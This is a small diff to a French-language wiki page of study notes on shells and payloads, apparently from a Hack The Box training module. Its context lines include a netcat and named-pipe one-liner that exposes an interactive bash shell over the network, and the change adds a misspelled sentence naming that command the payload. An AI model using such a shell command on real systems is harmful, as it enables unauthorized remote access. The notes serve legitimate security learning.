@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-08T14:43:58.721Z
+date: 2025-05-08T14:45:23.946Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -138,7 +138,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip cible> <
 6. **`> /tmp/f`**
 	Redirige ce que Netcat reçoit vers le pipe.
   
-  
+La ocmmande ci-dessu est donc considérée comme le payload.
 
 
 
